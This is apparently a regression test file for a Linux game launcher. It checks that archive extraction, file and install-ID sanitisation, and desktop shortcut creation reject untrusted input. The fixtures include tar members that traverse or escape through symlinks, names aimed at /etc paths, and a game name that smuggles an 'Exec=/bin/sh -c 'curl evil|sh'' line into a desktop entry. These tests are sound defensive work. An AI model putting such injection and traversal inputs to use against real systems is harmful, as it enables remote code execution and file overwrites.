"""Regression tests for the untrusted inputs GameHandler handles.

Release archives and asset names come from GitHub, and game names come from
whatever the user (or a Steam lookup) typed. Both reach the filesystem.
"""

import io
import json
import os
import tarfile
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from gamehandler.covers import MAX_RESPONSE_BYTES
from gamehandler.installers import safe_download_name
from gamehandler.models import Game
from gamehandler.runners import (
    METADATA_NAME,
    ProtonManager,
    ReleaseInfo,
    create_desktop_shortcut,
    desktop_exec,
    escape_desktop_value,
    extract_archive,
    safe_archive_name,
    safe_install_id,
)


def _tar_with(members, root: Path, name: str = "evil.tar") -> Path:
    """Build a tarball whose members are (arcname, data, kind) triples."""
    path = root / name
    with tarfile.open(path, "w") as tar:
        for arcname, data, kind in members:
            if kind == "file":
                info = tarfile.TarInfo(arcname)
                payload = data.encode()
                info.size = len(payload)
                info.mode = 0o755
                tar.addfile(info, io.BytesIO(payload))
            elif kind == "symlink":
                info = tarfile.TarInfo(arcname)
                info.type = tarfile.SYMTYPE
                info.linkname = data
                tar.addfile(info)
    return path


def _tar_bytes(members) -> bytes:
    payload = io.BytesIO()
    with tarfile.open(fileobj=payload, mode="w:gz") as tar:
        for arcname, data in members:
            info = tarfile.TarInfo(arcname)
            contents = data.encode()
            info.size = len(contents)
            info.mode = 0o755
            tar.addfile(info, io.BytesIO(contents))
    return payload.getvalue()


def _tar_bytes_with_kinds(members) -> bytes:
    payload = io.BytesIO()
    with tarfile.open(fileobj=payload, mode="w:gz") as tar:
        for arcname, data, kind in members:
            info = tarfile.TarInfo(arcname)
            info.mode = 0o755
            if kind == "file":
                contents = data.encode()
                info.size = len(contents)
                tar.addfile(info, io.BytesIO(contents))
            elif kind == "symlink":
                info.type = tarfile.SYMTYPE
                info.linkname = data
                tar.addfile(info)
    return payload.getvalue()


class _Response:
    def __init__(self, payload: bytes, content_length: int | None = None):
        self._stream = io.BytesIO(payload)
        self.headers = {}
        if content_length is not None:
            self.headers["Content-Length"] = str(content_length)

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        return False

    def read(self, size=-1):
        return self._stream.read(size)


class ArchiveExtractionTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.dest = self.root / "runners"
        self.dest.mkdir()

    def test_normal_archive_extracts_and_keeps_the_executable_bit(self):
        archive = _tar_with(
            [("GE-Proton/files/bin/wine", "#!/bin/sh\n", "file")], self.root, "ok.tar"
        )
        extract_archive(archive, self.dest)
        wine = self.dest / "GE-Proton" / "files" / "bin" / "wine"
        self.assertTrue(wine.is_file())
        self.assertTrue(os.access(wine, os.X_OK), "Wine builds must stay executable")

    def test_supported_xz_and_bzip2_streams_extract(self):
        for mode, suffix in (("w:xz", "xz"), ("w:bz2", "bz2")):
            with self.subTest(suffix=suffix):
                archive = self.root / f"runner.tar.{suffix}"
                with tarfile.open(archive, mode) as tar:  # type: ignore[call-overload]
                    info = tarfile.TarInfo("runner/files/bin/wine")
                    payload = b"wine"
                    info.size = len(payload)
                    info.mode = 0o755
                    tar.addfile(info, io.BytesIO(payload))
                destination = self.root / f"dest-{suffix}"
                extract_archive(archive, destination)
                self.assertTrue((destination / "runner/files/bin/wine").is_file())

    def test_parent_traversal_member_is_refused(self):
        archive = _tar_with([("../escaped.txt", "pwned", "file")], self.root)
        with self.assertRaises(Exception):
            extract_archive(archive, self.dest)
        self.assertFalse((self.root / "escaped.txt").exists())

    def test_absolute_member_is_confined_to_the_destination(self):
        archive = _tar_with([("/tmp/gh-absolute-escape", "pwned", "file")], self.root)
        extract_archive(archive, self.dest)
        # The leading separator is stripped rather than honoured, so the member
        # lands inside the runners directory and never at the absolute path.
        self.assertFalse(Path("/tmp/gh-absolute-escape").exists())
        self.assertTrue((self.dest / "tmp" / "gh-absolute-escape").is_file())

    def test_symlink_escaping_the_destination_is_refused(self):
        archive = _tar_with([("link", "../../outside", "symlink")], self.root)
        with self.assertRaises(Exception):
            extract_archive(archive, self.dest)

    def test_member_limit_stops_streaming_inside_private_staging(self):
        archive = _tar_with(
            [("runner/a", "a", "file"), ("runner/b", "b", "file")], self.root
        )
        with (
            mock.patch("gamehandler.runners.MAX_ARCHIVE_MEMBERS", 1),
            self.assertRaisesRegex(RuntimeError, "too many members"),
        ):
            extract_archive(archive, self.dest)
        self.assertTrue((self.dest / "runner" / "a").is_file())
        self.assertFalse((self.dest / "runner" / "b").exists())

    def test_uncompressed_payload_limit_is_checked_before_member_extraction(self):
        archive = _tar_with([("runner/large", "1234", "file")], self.root)
        with (
            mock.patch("gamehandler.runners.MAX_ARCHIVE_UNCOMPRESSED_BYTES", 3),
            self.assertRaisesRegex(RuntimeError, "payload size limit"),
        ):
            extract_archive(archive, self.dest)
        self.assertFalse((self.dest / "runner" / "large").exists())

    def test_missing_standard_data_filter_fails_closed(self):
        archive = _tar_with([("runner/file", "safe", "file")], self.root)
        with (
            mock.patch.object(tarfile, "data_filter", None),
            self.assertRaisesRegex(RuntimeError, "requires Python tarfile.data_filter"),
        ):
            extract_archive(archive, self.dest)
        self.assertEqual(list(self.dest.iterdir()), [])

    def test_pax_metadata_counts_toward_decompressed_stream_limit(self):
        archive = self.root / "pax.tar.gz"
        with tarfile.open(archive, "w:gz", format=tarfile.PAX_FORMAT) as tar:
            info = tarfile.TarInfo("runner/files/bin/wine")
            info.pax_headers = {"comment": "A" * 4096}
            payload = b"wine"
            info.size = len(payload)
            tar.addfile(info, io.BytesIO(payload))
        with (
            mock.patch("gamehandler.runners.MAX_ARCHIVE_DECOMPRESSED_BYTES", 1024),
            self.assertRaisesRegex(RuntimeError, "decompressed stream limit"),
        ):
            extract_archive(archive, self.dest)


class NameSanitisationTests(unittest.TestCase):
    def test_asset_names_are_reduced_to_a_bare_filename(self):
        self.assertEqual(safe_archive_name("GE-Proton9-5.tar.gz"), "GE-Proton9-5.tar.gz")
        self.assertEqual(safe_archive_name("../../etc/cron.d/x"), "x")
        self.assertEqual(safe_archive_name("/etc/passwd"), "passwd")
        self.assertEqual(safe_archive_name(".."), "runner.tar.gz")
        self.assertEqual(safe_archive_name(""), "runner.tar.gz")
        self.assertEqual(safe_archive_name("", "fallback.tgz"), "fallback.tgz")

    def test_install_ids_that_could_escape_are_rejected(self):
        self.assertEqual(safe_install_id("GE-Proton9-5"), "GE-Proton9-5")
        for bad in ("..", "../../home", "a/b", "", ".hidden", "a\\b"):
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                safe_install_id(bad)

    def test_download_filenames_are_reduced_to_a_bare_filename(self):
        self.assertEqual(safe_download_name("SteamSetup.exe"), "SteamSetup.exe")
        self.assertEqual(safe_download_name("../../evil.exe"), "evil.exe")
        self.assertEqual(safe_download_name("", "steam"), "steam.exe")

    def test_uninstall_refuses_to_walk_out_of_the_runners_directory(self):
        with tempfile.TemporaryDirectory() as tmp:
            manager = ProtonManager(Path(tmp) / "runners")
            with self.assertRaises(ValueError):
                manager.uninstall("../../")

    def test_uninstall_ignores_a_symlinked_runner_directory(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            runners = root / "runners"
            runners.mkdir()
            precious = root / "precious"
            precious.mkdir()
            (precious / "keep.txt").write_text("keep")
            (runners / "linked").symlink_to(precious, target_is_directory=True)
            ProtonManager(runners).uninstall("linked")
            self.assertTrue((precious / "keep.txt").exists())

    def test_install_id_is_derived_from_the_tag_not_the_asset_name(self):
        release = ReleaseInfo(
            tag="GE-Proton9-5", name="../../evil.tar.gz", download_url="", size=0
        )
        self.assertEqual(safe_install_id(release.install_id), "GE-Proton9-5")

    def test_release_tags_are_sanitised_before_becoming_install_paths(self):
        slash = ReleaseInfo("release/v1", "", "", 0).install_id
        parent = ReleaseInfo("../../relocated", "", "", 0).install_id
        self.assertRegex(slash, r"^release-v1~h[0-9a-f]{12}$")
        self.assertRegex(parent, r"^relocated~h[0-9a-f]{12}$")

    def test_distinct_raw_tags_and_family_pairs_never_alias_one_install_id(self):
        transformed = ReleaseInfo("release/v1", "", "", 0).install_id
        self.assertNotEqual(
            transformed,
            ReleaseInfo(transformed, "", "", 0).install_id,
        )
        prefix = "x" * 180
        self.assertNotEqual(
            ReleaseInfo(prefix + "A", "", "", 0).install_id,
            ReleaseInfo(prefix + "B", "", "", 0).install_id,
        )
        self.assertNotEqual(
            ReleaseInfo("wine-staging-x", "", "", 0, "proton-ge").install_id,
            ReleaseInfo("x", "", "", 0, "wine-staging").install_id,
        )
        self.assertNotEqual(
            ReleaseInfo("tkg-x", "", "", 0, "wine-staging").install_id,
            ReleaseInfo("x", "", "", 0, "wine-staging-tkg").install_id,
        )
        self.assertLessEqual(
            len(ReleaseInfo("t" * 300, "", "", 0, "f" * 300).install_id), 180
        )


class RunnerInstallationTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.runners = self.root / "runners"
        self.manager = ProtonManager(self.runners)

    @staticmethod
    def _release(tag="new-runner"):
        return ReleaseInfo(
            tag=tag,
            name="runner.tar.gz",
            download_url="https://example.invalid/runner.tar.gz",
            size=0,
        )

    def _install(self, payload: bytes, tag="new-runner", content_length=None):
        response = _Response(payload, content_length)
        with mock.patch("gamehandler.runners.urlopen", return_value=response):
            return self.manager.install(self._release(tag))

    def test_metadata_keeps_legacy_runner_directory_recognised(self):
        legacy = self.runners / "wine-staging-x"
        wine = legacy / "bin" / "wine"
        wine.parent.mkdir(parents=True)
        wine.write_text("legacy", encoding="utf-8")
        (legacy / METADATA_NAME).write_text(
            json.dumps({"family": "wine-staging", "tag": "x"}),
            encoding="utf-8",
        )

        self.assertTrue(self.manager.is_installed("x", "wine-staging"))

    def test_staged_archive_cannot_overwrite_another_runner(self):
        existing = self.runners / "existing-runner" / "files" / "bin" / "wine"
        existing.parent.mkdir(parents=True)
        existing.write_text("keep me")
        payload = _tar_bytes(
            [("existing-runner/files/bin/wine", "replacement")]
        )

        installed = self._install(payload)

        self.assertEqual(existing.read_text(), "keep me")
        self.assertEqual(installed, self.runners / "new-runner")
        self.assertEqual(
            (installed / "files" / "bin" / "wine").read_text(), "replacement"
        )

    def test_download_uses_a_fresh_private_staging_directory(self):
        payload = _tar_bytes([("archive-root/files/bin/wine", "runner")])
        observed_modes = []

        def open_from_private_stage(*_args, **_kwargs):
            stages = [
                path
                for path in self.runners.iterdir()
                if path.name.startswith(".install-")
            ]
            self.assertEqual(len(stages), 1)
            observed_modes.append(stages[0].stat().st_mode & 0o777)
            return _Response(payload)

        with mock.patch("gamehandler.runners.urlopen", side_effect=open_from_private_stage):
            self.manager.install(self._release())

        self.assertEqual(observed_modes, [0o700])
        self.assertFalse(any(path.name.startswith(".install-") for path in self.runners.iterdir()))

    def test_slashes_and_parent_segments_in_tag_cannot_relocate_install(self):
        payload = _tar_bytes([("archive-root/files/bin/wine", "runner")])

        installed = self._install(payload, "../../relocated")

        expected = self.runners / self._release("../../relocated").install_id
        self.assertEqual(installed, expected)
        self.assertTrue(installed.is_dir())
        self.assertFalse((self.root / "relocated").exists())

    def test_post_rename_symlink_cannot_retarget_through_existing_sibling(self):
        bridge = self.runners / "bridge"
        bridge.mkdir(parents=True)
        (bridge / "back").write_text("PREEXISTING")
        payload = _tar_bytes_with_kinds(
            [
                ("new-runner/files/bin/wine", "runner", "file"),
                ("new-runner/back", "staged", "file"),
                ("new-runner/escape", "../bridge/back", "symlink"),
                ("bridge/back", "../new-runner/back", "symlink"),
            ]
        )

        with self.assertRaisesRegex(RuntimeError, "escaping link"):
            self._install(payload)

        self.assertEqual((bridge / "back").read_text(), "PREEXISTING")
        self.assertFalse((self.runners / "new-runner").exists())

    def test_existing_target_is_never_replaced(self):
        target = self.runners / "new-runner"
        target.mkdir(parents=True)
        marker = target / "keep"
        marker.write_text("original")
        payload = _tar_bytes([("archive-root/files/bin/wine", "runner")])

        with self.assertRaisesRegex(FileExistsError, "already installed"):
            self._install(payload)

        self.assertEqual(marker.read_text(), "original")

    def test_target_created_during_install_wins_atomic_no_replace_race(self):
        payload = _tar_bytes([("archive-root/files/bin/wine", "runner")])
        response = _Response(payload)
        original_read = response.read
        target = self.runners / "new-runner"

        def read_and_race(size=-1):
            chunk = original_read(size)
            if not chunk and not target.exists():
                target.mkdir()
                (target / "keep").write_text("race winner")
            return chunk

        response.read = read_and_race
        with (
            mock.patch("gamehandler.runners.urlopen", return_value=response),
            self.assertRaisesRegex(FileExistsError, "already installed"),
        ):
            self.manager.install(self._release())

        self.assertEqual((target / "keep").read_text(), "race winner")
        self.assertFalse(any(path.name.startswith(".install-") for path in self.runners.iterdir()))

    def test_oversized_content_length_is_rejected_and_staging_is_cleaned(self):
        with (
            mock.patch("gamehandler.runners.MAX_RUNNER_ARCHIVE_BYTES", 8),
            self.assertRaisesRegex(RuntimeError, "download size limit"),
        ):
            self._install(b"", content_length=9)
        self.assertEqual(list(self.runners.iterdir()), [])

    def test_oversized_stream_is_stopped_and_staging_is_cleaned(self):
        with (
            mock.patch("gamehandler.runners.MAX_RUNNER_ARCHIVE_BYTES", 8),
            self.assertRaisesRegex(RuntimeError, "download size limit"),
        ):
            self._install(b"123456789", content_length=4)
        self.assertEqual(list(self.runners.iterdir()), [])

    def test_invalid_archive_failure_removes_all_staging_files(self):
        with self.assertRaises(tarfile.ReadError):
            self._install(b"not a tar archive")
        self.assertEqual(list(self.runners.iterdir()), [])


class DesktopEntryTests(unittest.TestCase):
    def test_newlines_in_a_value_are_escaped(self):
        self.assertEqual(escape_desktop_value("a\nb"), "a\\nb")
        self.assertEqual(escape_desktop_value("a\tb"), "a\\tb")
        self.assertEqual(escape_desktop_value("a\\b"), "a\\\\b")

    def test_percent_is_escaped_only_in_exec(self):
        self.assertEqual(desktop_exec("run %f"), "run %%f")
        self.assertEqual(escape_desktop_value("100% done"), "100% done")

    def test_a_malicious_game_name_cannot_inject_desktop_keys(self):
        with tempfile.TemporaryDirectory() as tmp:
            game = Game(name="Doom\nExec=/bin/sh -c 'curl evil|sh'\nName=Doom")
            path = create_desktop_shortcut(game, "gamehandler --launch 1", Path(tmp))
            body = path.read_text(encoding="utf-8")
            exec_lines = [line for line in body.splitlines() if line.startswith("Exec=")]
            self.assertEqual(exec_lines, ["Exec=gamehandler --launch 1"])
            self.assertEqual(
                len([line for line in body.splitlines() if line.startswith("Name=")]), 1
            )

    def test_shortcut_is_a_valid_single_group_entry(self):
        with tempfile.TemporaryDirectory() as tmp:
            game = Game(name="Hades II")
            path = create_desktop_shortcut(game, "gamehandler --launch abc", Path(tmp))
            lines = path.read_text(encoding="utf-8").splitlines()
            self.assertEqual(lines[0], "[Desktop Entry]")
            self.assertIn("Name=Hades II", lines)
            self.assertIn("Type=Application", lines)
            self.assertTrue(os.access(path, os.X_OK))


class DownloadLimitTests(unittest.TestCase):
    def test_cover_downloads_are_bounded(self):
        self.assertLessEqual(MAX_RESPONSE_BYTES, 32 * 1024 * 1024)


if __name__ == "__main__":
    unittest.main()
